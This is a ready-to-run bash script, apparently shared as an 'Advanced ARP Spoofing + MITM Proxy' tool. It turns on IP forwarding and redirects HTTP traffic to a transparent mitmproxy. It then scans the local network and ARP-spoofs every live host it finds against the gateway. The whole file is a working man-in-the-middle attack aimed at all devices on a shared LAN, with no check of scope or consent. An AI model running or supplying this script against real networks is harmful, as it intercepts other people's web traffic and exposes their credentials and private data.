#!/bin/bash

clear
# Define colors
RED='\033[1;31m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Fancy animated title
echo -e "${RED}"
echo "   ___         _    _        __  __ _ _           "
echo "  / _ \ _ __  (_)__| | ___  |  \/  (_) |_ ___ ___ "
echo " | | | | '_ \ | / _\` |/ _ \ | |\/| | | __/ _ / __|"
echo " | |_| | | | || | (_| |  __/ | |  | | | ||  __\__ \\"
echo "  \___/|_| |_|/ |\__,_|\___| |_|  |_|_|\__\___|___/"
echo "             |__/                                 "
echo -e "${NC}"
sleep 0.3
echo -e "${CYAN}⚡ Advanced ARP Spoofing + MITM Proxy${NC}"
sleep 0.2
echo -e "${YELLOW}🛠️  Developed by: Tonilkumar (CEO @ Inovwave Technologies)${NC}"
sleep 0.2
echo -e "${YELLOW}🧠 Bug Bounty Hunter | Ethical Hacker | Embedded Dev${NC}"
echo
sleep 0.5


# ======================= CONFIG =========================
IFACE=${1:-$(ip route | grep default | awk '{print $5}')}  # Auto-detect if not given
PROXY_PORT=8080                                            # mitmproxy HTTP port
MITMPROXY_LOG="mitmproxy.log"
ENABLE_PROXY=true                                          # Set to false to skip proxy launch
# ========================================================

trap cleanup INT

function cleanup() {
    echo -e "\n[!] Cleaning up..."
    killall arpspoof 2>/dev/null
    iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port $PROXY_PORT 2>/dev/null
    echo 0 | tee /proc/sys/net/ipv4/ip_forward >/dev/null
    echo "[+] Done. Exiting."
    exit
}

# Check root
if [[ $EUID -ne 0 ]]; then
    echo "[!] Please run as root."
    exit 1
fi

# Validate interface
if ! ip link show "$IFACE" &> /dev/null; then
    echo "[!] Invalid network interface: $IFACE"
    exit 1
fi

# Get local IP & gateway
MY_IP=$(ip -4 addr show "$IFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
GATEWAY_IP=$(ip route | grep default | awk '{print $3}')
echo "[*] Using interface: $IFACE"
echo "[*] Your IP: $MY_IP"
echo "[*] Gateway IP: $GATEWAY_IP"

# Enable IP forwarding
echo 1 | tee /proc/sys/net/ipv4/ip_forward >/dev/null

# Optional iptables HTTP redirect
iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port $PROXY_PORT

# Scan for targets
echo "[*] Scanning for live hosts..."
TARGETS=$(arp-scan --interface="$IFACE" --localnet | grep -oP '(\d{1,3}\.){3}\d{1,3}' | grep -vE "$MY_IP|$GATEWAY_IP" | sort -u)

if [[ -z "$TARGETS" ]]; then
    echo "[!] No targets found. Exiting."
    cleanup
fi

echo "[*] Found targets:"
echo "$TARGETS"

# Launch mitmproxy if enabled
if [ "$ENABLE_PROXY" = true ]; then
    echo "[*] Starting mitmproxy on port $PROXY_PORT..."
    nohup mitmproxy --mode transparent --showhost -p $PROXY_PORT > "$MITMPROXY_LOG" 2>&1 &
    echo "[+] mitmproxy logging to $MITMPROXY_LOG"
fi

# Start ARP spoofing
for TARGET_IP in $TARGETS; do
    echo "[*] Spoofing $TARGET_IP <--> $GATEWAY_IP"
    gnome-terminal -- bash -c "arpspoof -i $IFACE -t $TARGET_IP $GATEWAY_IP; exec bash" &
    gnome-terminal -- bash -c "arpspoof -i $IFACE -t $GATEWAY_IP $TARGET_IP; exec bash" &
done

echo -e "\n[+] ARP spoofing in progress... Press Ctrl+C to stop and cleanup."
wait